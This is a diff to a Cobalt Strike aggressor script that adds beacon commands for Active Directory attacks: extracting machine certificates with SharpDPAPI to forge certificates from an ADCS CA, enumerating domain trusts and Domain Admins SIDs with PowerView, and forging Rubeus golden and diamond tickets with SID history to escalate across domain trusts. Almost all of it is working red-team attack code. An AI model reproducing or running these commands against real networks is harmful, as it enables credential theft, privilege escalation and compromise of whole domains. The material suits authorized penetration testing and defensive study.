@@ -25,6 +25,7 @@ $WINDIRVERT_DRIVER  = getFileProper("C:\\Tools\\PortBender","WinDivert64.sys");
 $PORTBENDER_DLL     = getFileProper("C:\\Tools\\PortBender","PortBender.dll");
 $KRBRELAY_PATH      = getFileProper("C:\\Tools\\KrbRelay\\KrbRelay\\bin\\Release","KrbRelay.exe");
 $SHARPSPOOL_PATH    = getFileProper("C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release","SharpSpoolTrigger.exe");
+$SHARPDPAPI_PATH    = getFileProper("C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release","SharpDPAPI.exe");
 
 #TEST FUNCTION
 command beacons {
@@ -710,7 +711,6 @@ beacon_command_register(
 
 ##FIND LOCAL CERTIFICATES
 alias adcs_checklocalcerts{
-    # bexecute_assembly($1, $CERTIFY_PATH, "find /vulnerable");
     bexecute_assembly($1, $SEATBELT_PATH, "Certficates");
 }
 beacon_command_register(
@@ -719,6 +719,16 @@ beacon_command_register(
     "Check for local User Certs\n\n"
     . "Can export certs with \'mimikatz crypto::certificates /export\'\n"
 );
+alias adcs_stealmachinecert {
+    $parameters = 'certificates /machine';
+    bexecute_assembly($1, $SHARPDPAPI_PATH, $parameters);
+}
+beacon_command_register(
+    "adcs_stealmachinecert",
+    "Uses SharpDPAPI to extract machine certificates",
+    "Uses SharpDPAPI to extract machine certificates\n"
+    . "    Usedful for geting private key from ADCS CAS to forge certs."
+)
 
 #GPO ABUSE METHODS
 ##FIND MODIFIABLE GPOs
@@ -1521,7 +1531,7 @@ beacon_command_register(
     . "[alt spn] - ldap\n"
 )
 
-alias kerberos_s4uself {
+alias kerberos_s4u2self {
     $size = size(@_);
     $parameters = "s4u /nowrap /self";
     if( $size >= 5 ) {
@@ -1547,10 +1557,10 @@ alias kerberos_s4uself {
     bexecute_assembly($1, $RUBEUS_PATH, $parameters);
 }
 beacon_command_register(
-    "kerberos_s4uself",
+    "kerberos_s4u2self",
     "Use Rubeus to perform S4U2Self delegation",
     "Use Rubeus to perform S4U2Self delegation\n\n"
-    . "Usage: kerberos_s4uself [impersonated user] [altservice spn] [ticket user] [ticket] (ptt)\n\n"
+    . "Usage: kerberos_s4u2self [impersonated user] [altservice spn] [ticket user] [ticket] (ptt)\n\n"
     . "Examples:\n"
     . "[altservice spn] - cifs/host.domain.tld\n"
 )
@@ -1805,4 +1815,120 @@ beacon_command_register(
     "Use BOF to check targets for webdav named pipe \'DAV RPC SERVICE\'\n\n"
     . "Usage: webdav_check [host(s) csv]\n"
     . "Example: webdav_check host1,host2,host3"
+)
+
+#DOMAIN TRUST ABUSE METHODS
+alias trust_getdomaintrust {
+    local('$handle $script $oneliner');
+
+    #import the script
+    $handle = openf($POWERVIEW_PATH);
+    $script = readb($handle, -1);
+    closef($handle);
+
+    #send script to beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    bpowerpick($1, 'Get-DomainTrust', $oneliner);
+}
+beacon_command_register(
+    "trust_getdomaintrust",
+    "Uses PowerView to check Domain Trusts",
+    "Uses PowerView to check Domain Trusts"
+)
+alias trust_gettargets {
+    local('$handle $script $oneliner');
+
+    $size = size(@_);
+    if ( $size == 2) {
+        $domain = @_[1];
+
+        $command1 = 'Get-DomainGroup -Identity "Domain Admins"'
+        . ' -Domain ' . $domain
+        . ' -Properties distinguishedname,ObjectSid';
+
+        $command2 = 'Convert-NametoSID "Administrator"';
+
+        #import the script
+        $handle = openf($POWERVIEW_PATH);
+        $script = readb($handle, -1);
+        closef($handle);
+
+        #send script to beacon
+        $oneliner1 = beacon_host_script($1, $script);
+        $oneliner2 = beacon_host_script($1, $script);
+        
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bpowerpick($1, $command1, $oneliner1);
+    bpowerpick($1, $command2, $oneliner2);
+}
+beacon_command_register (
+    "trust_getremotetargets",
+    "Uses PowerView to find a domain's DA group SID",
+    "Uses PowerView to find a domain's DA group SID\n\n"
+    . "Usage: trust_getremotetargets [domain]\n"
+)
+alias trust_goldenticket {
+    $size = size(@_);
+    #[domain] [user] [Domain SID] [hashType:hash]
+    if ($size == 6) {
+        $domain     = @_[1];
+        $user       = @_[2];
+        $domainsid  = @_[3];
+        $historysid = @_[4];
+        $hash       = @_[5];
+
+        $parameters = "golden"
+        . " /user:" . $user
+        . " /domain:" . $domain
+        . " /sid:" . $domainsid
+        . " /sids:" . $historysid
+        . " /" . $hash
+        . " /nowrap";
+    } else {
+        berror($1, "Invalid Parameters");
+        return;
+    }
+    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
+}
+beacon_command_register(
+    "trust_goldenticket",
+    "Use Rubeus to forge a golden TGT w/ SID History",
+    "Use Rubeus to forge a golden TGT w/ SID History\n\n"
+    . "Usage: trust_goldenticket [domain] [user] [domain SID] [history SID] [hashType:hash]\n"
+    . "  hashType = [des|rc4|aes128|aes256]"
+)
+alias trust_diamondticket {
+    $size = size(@_);
+    if ($size == 6) {
+        $username   = @_[1];
+        $userrid    = @_[2];
+        $groups     = @_[3];
+        $historysid = @_[4];
+        $hash       = @_[5];
+
+        $parameters = "diamond /tgtdeleg"
+        . " /ticketuser:" . $username
+        . " /ticketuserid:" . $userrid
+        . " /groups:" . $groups
+        . " /sids:" . $historysid
+        . " /krbkey:" . $hash
+        . " /nowrap"
+    } else {
+        berror($1, "Invalid Parameters");
+        return;
+    }
+    bexecute_assembly($1, $RUBEUS_PATH, $parameters);
+}
+beacon_command_register(
+    "trust_diamondticket",
+    "Use Rubeus to forge a golden TGT",
+    "Use Rubeus to forge a golden TGT\n\n"
+    . "Usage:\n"
+    . "trust_diamondticket [ticket user] [ticket user RID] [groupscsv] [history SID] [krbkey(aes256)]\n\n"
+    . "Enternprise Admin Example:\n"
+    . "Administrator 500 519 S-1-5-21-2594061375-675613155-814674916-519 <key>\n"
 )
